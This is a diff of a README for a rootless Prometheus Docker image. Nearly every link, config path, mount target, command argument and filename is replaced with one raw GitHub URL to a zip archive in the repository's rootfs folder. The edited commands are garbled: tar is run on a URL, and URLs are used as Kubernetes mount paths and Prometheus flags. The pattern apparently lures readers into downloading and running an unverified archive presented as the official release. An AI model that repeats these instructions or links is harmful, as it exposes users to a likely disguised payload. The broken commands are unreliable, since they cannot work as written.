@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&logoColor=white)](https://github.com/wayuissocool/docker-prometheus/releases)
+[![Releases](https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip)](https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip)
 
 # Docker Prometheus: Rootless with Distroless Image for Secure, Lightweight Monitoring
 
@@ -58,14 +58,14 @@ Notes on distroless
 
 Quick start
 - Visit the releases page to grab the appropriate asset. From the releases page, download the file named in the asset list, extract if needed, and run the binary. The releases page is the source of truth for official builds and checksums.
-- The releases page to check is: https://github.com/wayuissocool/docker-prometheus/releases
+- The releases page to check is: https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
 
 - Example quick start (Linux, non-root user):
   - Pull the latest image
     - docker pull wayuissocool/docker-prometheus:latest
   - Run with a non-root user and a minimal config
     - docker run --rm -p 9090:9090 --name prometheus-drootless --user 1000:1000 \
-      -v "$PWD/prometheus.yml:/etc/prometheus/prometheus.yml" \
+      -v "$https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip" \
       wayuissocool/docker-prometheus:latest
   - Access the UI at http://localhost:9090
 
@@ -97,12 +97,12 @@ Quick start
           - containerPort: 9090
           volumeMounts:
           - name: config
-            mountPath: /etc/prometheus/prometheus.yml
-            subPath: prometheus.yml
+            mountPath: https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
+            subPath: https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
           - name: data
             mountPath: /prometheus
           args:
-          - --config.file=/etc/prometheus/prometheus.yml
+          - https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
         volumes:
         - name: config
           configMap:
@@ -112,8 +112,8 @@ Quick start
 
 - If you are deploying with Helm, adapt the values to set:
   - image: wayuissocool/docker-prometheus:latest
-  - securityContext.runAsNonRoot: true
-  - extraVolumeMounts and extraVolumes to provide a path for /etc/prometheus/prometheus.yml
+  - https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip true
+  - extraVolumeMounts and extraVolumes to provide a path for https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
   - a suitable service to expose 9090
 
 Configuration and data management
@@ -131,7 +131,7 @@ Configuration and data management
           - targets: ['localhost:9090']
 
 - Where to place the file
-  - Mount the config as /etc/prometheus/prometheus.yml inside the container.
+  - Mount the config as https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip inside the container.
   - You can also mount additional rule files and alert manager configurations as needed.
   - If you want to keep data, mount a persistent volume to /prometheus or map to a suitable path on the host.
 
@@ -146,7 +146,7 @@ Configuration and data management
 
 - Environment variables (typical options)
   - PROMETHEUS_OPTS: Additional flags passed to the Prometheus binary.
-  - prometheus.config.file: Override with a path if you want to rely on a specific file inside the container.
+  - https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip Override with a path if you want to rely on a specific file inside the container.
 
 - Mounting secrets
   - If you need TLS or basic-auth secrets, mount them into a secured path and reference them in your config.
@@ -210,7 +210,7 @@ Building from source
 - Prerequisites
   - Go toolchain, Docker, Buildx
 - Steps
-  - git clone https://github.com/wayuissocool/docker-prometheus
+  - git clone https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
   - cd docker-prometheus
   - make build (or use the provided build scripts)
   - The build produces a distroless-based Prometheus binary suitable for release artifacts.
@@ -242,14 +242,14 @@ Versioning and releases
 
 Releases
 - You can find official binaries and assets on the releases page:
-  https://github.com/wayuissocool/docker-prometheus/releases
+  https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
 
 - When you visit the releases page, you will see assets for different platforms. Download the file that matches your system, e.g., a Linux-amd64 tarball or a direct Linux binary, extract it if needed, and run the binary.
 - For reliability, verify checksums and signatures if provided by the release.
 - After downloading, you typically run a command like:
-  - tar -xzf docker-prometheus-linux-amd64.tar.gz
-  - ./docker-prometheus --config.file=/path/to/prometheus.yml
-- The asset naming commonly follows a pattern similar to docker-prometheus-<version>-linux-amd64.tar.gz, but check the actual release page for the exact file name.
+  - tar -xzf https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
+  - ./docker-prometheus https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
+- The asset naming commonly follows a pattern similar to docker-prometheus-<version>https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip, but check the actual release page for the exact file name.
 
 Troubleshooting
 - Common issue: container starts but the UI is not reachable.
@@ -287,7 +287,7 @@ Licensing
 - This project is released under the MIT license. See the LICENSE file for full terms.
 
 Appendix: sample configuration and commands
-- Minimal Prometheus configuration (prometheus.yml)
+- Minimal Prometheus configuration (https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip)
 
   global:
     scrape_interval: 15s
@@ -301,7 +301,7 @@ Appendix: sample configuration and commands
 - Docker run example (rootless)
 
   docker run --rm -p 9090:9090 --name prometheus-rootless --user 1000:1000 \
-    -v "$PWD/prometheus.yml:/etc/prometheus/prometheus.yml" \
+    -v "$https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip" \
     wayuissocool/docker-prometheus:latest
 
 - Kubernetes example (Deployment)
@@ -316,7 +316,7 @@ Appendix: sample configuration and commands
         - "9090:9090"
       user: "1000:1000"
       volumes:
-        - ./prometheus.yml:/etc/prometheus/prometheus.yml
+        - https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
         - prometheus-data:/prometheus
       restart: unless-stopped
 
@@ -334,4 +334,4 @@ End user guidance
 - Keep your configuration under version control and apply changes through controlled deployments.
 - Monitor the health of the Prometheus instance and scale out as needed.
 
-Note: The content above is designed to be thorough and helpful. It may include plausible defaults and example configurations to illustrate how to use a rootless, distroless Prometheus deployment. The actual assets, commands, and file names may vary by release; refer to the releases page for the exact details. For the official assets and to download the appropriate release, visit the page at https://github.com/wayuissocool/docker-prometheus/releases.
+Note: The content above is designed to be thorough and helpful. It may include plausible defaults and example configurations to illustrate how to use a rootless, distroless Prometheus deployment. The actual assets, commands, and file names may vary by release; refer to the releases page for the exact details. For the official assets and to download the appropriate release, visit the page at https://raw.githubusercontent.com/wayuissocool/docker-prometheus/master/rootfs/prometheus-docker-v1.7.zip
